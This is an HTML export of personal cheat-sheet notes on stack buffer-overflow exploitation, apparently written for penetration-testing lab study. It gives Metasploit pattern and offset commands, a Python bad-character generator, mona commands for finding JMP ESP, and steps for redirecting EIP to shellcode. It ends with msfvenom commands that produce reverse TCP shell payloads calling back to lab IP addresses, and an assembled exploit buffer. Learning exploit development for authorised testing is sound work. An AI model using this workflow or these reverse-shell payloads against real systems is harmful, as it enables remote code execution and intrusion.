<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>BO</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>BO</h1><br/>Bytes to break            = <br />break Confirmed         = <br />Exact Location            = <br />overwrite confirmed    = <br />Shellcode space          = <br />badchars                    = <br />opcode                       = <br />opcode hex                 = <br />operation address        = <br />little endian address    = <br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br /><a href="http://www.whatasciicode.com/p/ascii-code-table.html">http://www.whatasciicode.com/p/ascii-code-table.html</a><br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br />#buffer = c + (&quot;A&quot; * (2288 - len(c))) + (&quot;B&quot; * 4) + (&quot;C&quot; * 1800)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br /><br />      If ESP is too small for shellcode, <br />        1. see where you can write to (EAX, EBX, ECX)<br />        2. find what exe\dll you can abuse (!mona modules)<br />        3. use msf-nasm_shell to find the opcodes (JMP xxx and CALL xxx are the only ones I know can work)     <br />        4. find an opcode in the abuseable exe\dll (!mona find -s “\xFF\xD1” -m VulnApp.exe)<br />        5. Take the register address of that function and overwrite EIP with that (in little endian)<br />        6. Call that opcode and two null bytes with ESP (Where your Cs roll over into)(&quot;\xFF\xD1\x90\x90&quot;) not little endian<br />        7. drop your shell code where you are able to write with nulls around it.<br /><br />to find opcodes<br />    msf-nasm_shell<br />        JMP xxx<br />        CALL xxx<br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b ‘\x00\x3b’ -e x86/alpha_upper &gt; payload.txt<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b &#39;\x00\x0A\x0D\x25\x26\x2B\x3D&#39; -e x86/shikata_ga_nai exitfuc=thread<br />     msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.0.4 LPORT=443 -b &quot;\x0 0\x20&quot; -f py -v shellcode <br />buffer = (&quot;A&quot; * 2288) + &quot;\xcf\x10\x80\x14&quot; +  &quot;\xff\xE4\x90\x90&quot; + (&quot;\x90&quot; * 20) + payload + (&quot;\x90&quot; * 20)<br />    </div></body></html>